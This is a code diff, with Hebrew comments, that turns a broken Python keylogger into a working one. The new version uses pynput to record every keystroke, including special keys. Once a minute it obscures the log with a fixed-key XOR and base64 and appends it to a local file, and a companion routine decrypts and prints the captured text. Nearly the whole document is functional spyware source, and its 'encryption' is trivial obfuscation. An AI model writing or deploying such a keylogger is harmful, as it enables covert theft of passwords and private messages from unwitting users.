@@ -1,106 +1,91 @@
+import base64
 from datetime import datetime
-from time import sleep
-import os
-from pynput import keyboard
-from collections import defaultdict
-import time
 import threading
+from pynput import keyboard
+import time
 
 
-class Key_loger:
-    def __init__(self, time_to_run):
+class KeyLogger:
+    def __init__(self, run_time):
+        self.run_time = run_time
+        self.current_keys = []
+        self.lock = threading.Lock()
         self.listener = keyboard.Listener(on_press=self.on_press)
-        self.time_to_run = time_to_run
         self.listener.start()
-        self.press_char = []
 
-    def stop_after_one_minute(self):
-        self.listener = keyboard.Listener(on_press=self.on_press)
-        self.listener.start()
-        for i in range(self.time_to_run):
-            self.press_char = [datetime.now().strftime("%d/%m/%Y %H:%M")]
-            sleep(60)
-            string = "".join(self.press_char)
-            return string
+    def on_press(self, key):
+        with self.lock:
+            try:
+                # טיפול במקשים מיוחדים ומקשים רגילים
+                if hasattr(key, 'char') and key.char is not None:
+                    self.current_keys.append(key.char)
+                else:
+                    self.current_keys.append(str(key).replace("Key.", ""))
+            except Exception as e:
+                print(f"שגיאה: {e}")
+
+    def stop_after_time(self):
+        for _ in range(self.run_time):
+            time.sleep(60)  # המתנה דקה
+
+            # איסוף והעברת הנתונים להצפנה
+            with self.lock:
+                keys_copy = self.current_keys.copy()
+                self.current_keys.clear()
+
+            log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
+            keys_str = ",".join(keys_copy)
+            encrypted_str = EncryptorDecryptor.encrypt(keys_str)
+
+            # כתיבה לקובץ
+            with open("encrypted_logs.txt", "a", encoding="utf-8") as f:
+                f.write(f"[{log_time}] {encrypted_str}\n")
 
         self.listener.stop()
 
-    # def stop_after_one_minute(self):
-    #     string = "".join(self.press_char)
-    #     return string
 
-    def on_press(self, key):
-        """ מאזין להקשות מקשים ושומר אותן לפי זמן """
-        try:
-            formatted_date = datetime.now().strftime("%d/%m/%Y %H:%M")
-            if hasattr(key, 'char') and key.char is not None:
-                self.press_char.append(key.char)
-            else:
-                self.press_char.append(key.name if hasattr(key, "name") else str(key))
-        except Exception as e:
-            print(f"שגיאה: {e}")
+class EncryptorDecryptor:
+    key = "613".encode('utf-8')  # מפתח קבוע להצפנה
 
+    @classmethod
+    def encrypt(cls, data):
+        """מצפין נתונים ומחזיר מחרוזת base64"""
+        data_bytes = data.encode('utf-8')
+        encrypted = bytes([data_bytes[i] ^ cls.key[i % len(cls.key)] for i in range(len(data_bytes))])
+        return base64.b64encode(encrypted).decode('utf-8')
 
-class Writer:
-    def __init__(self, data):
-        self.data = data
-        self.file_name = "key_logger_non_encrypted_file.txt"
-        self.write()
+    @classmethod
+    def decrypt(cls, filename):
+        """פיענוח הקובץ המוצפן והדפסת התוצאה"""
+        with open(filename, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
 
-    def write(self):
-        with open(self.file_name, "a") as f:
-            f.write(self.data)
+                # הפרדת התאריך מהטקסט המוצפן
+                timestamp_end = line.find(']')
+                if timestamp_end == -1:
+                    continue
 
+                encrypted_b64 = line[timestamp_end + 2:].strip()
+                # תיקון ריפוד למחרוזת base64
+                encrypted_b64 += '=' * ((4 - len(encrypted_b64) % 4) % 4)
 
-class EncryptorAndDecryptor:
-    def __init__(self, data):
-        self.data = data
-        self.encrypted_file_name = "key_logger_encrypted_file.txt"
-        self.decrypted_file_name = "key_logger_non_encrypted_file.txt"
-        self.key_word = "613"
+                try:
+                    encrypted_data = base64.b64decode(encrypted_b64)
+                except Exception as e:
+                    print(f"שגיאה בפיענוח base64: {e}")
+                    continue
 
-    def encrypt(self):
-        string = ""
-        key_length = len(self.key_word)
-
-        # with open(self.decrypted_file_name, "r") as read_file:
-        #     text = read_file.read()  # Read full file content
-
-        # XOR each character with the corresponding key character (cycling through the key)
-        for i in range(len(self.data)):
-            string += chr(ord(self.data[i]) ^ ord(self.key_word[i % key_length]))  #
-
-        # with open(self.encrypted_file_name, "w") as f:  # Overwrite to avoid appending errors
-        #    f.write(string)
-        return string
-
-    def decrypt(self):
-        string = ""
-        key_length = len(self.key_word)
-
-        with open(self.encrypted_file_name, "r") as read_file:
-            encrypted_text = read_file.read()  # Read full encrypted content
-
-        # XOR each character with the corresponding key character (cycling through the key)
-        for i in range(len(encrypted_text)):
-            string += chr(ord(encrypted_text[i]) ^ ord(self.key_word[i % key_length]))
-
-        print(string)
-        # with open(self.decrypted_file_name, "w") as f:  # Overwrite to restore original text
-        #     f.write(string)
+                # פענוח הנתונים
+                decrypted = bytes([encrypted_data[i] ^ cls.key[i % len(cls.key)] for i in range(len(encrypted_data))])
+                decrypted_str = decrypted.decode('utf-8', errors='replace')
+                print(f"{line[:timestamp_end + 1]} {decrypted_str}")
 
 
-class Manager:
-    def __init__(self, time_to_run):
-        self.time_to_run = time_to_run  # must be in minutes...it'll then iterate through this for 60 second intervals!
-        self.run_key_logger()
+# KeyLogger(1).stop_after_time()
 
-    def run_key_logger(self):
-        kl = Key_loger(self.time_to_run).stop_after_one_minute()
-        string = EncryptorAndDecryptor(str(kl)).encrypt()
-        # string2 = EncryptorAndDecryptor(Writer(string)).decrypt()
-        # Writer(string2)
-
-
-EncryptorAndDecryptor.decrypt()
-mc = Manager(1)
+decrypt = input("Decrypt the file? (y/n): ")
+if decrypt.lower() == 'y':
+    EncryptorDecryptor.decrypt("encrypted_logs.txt")
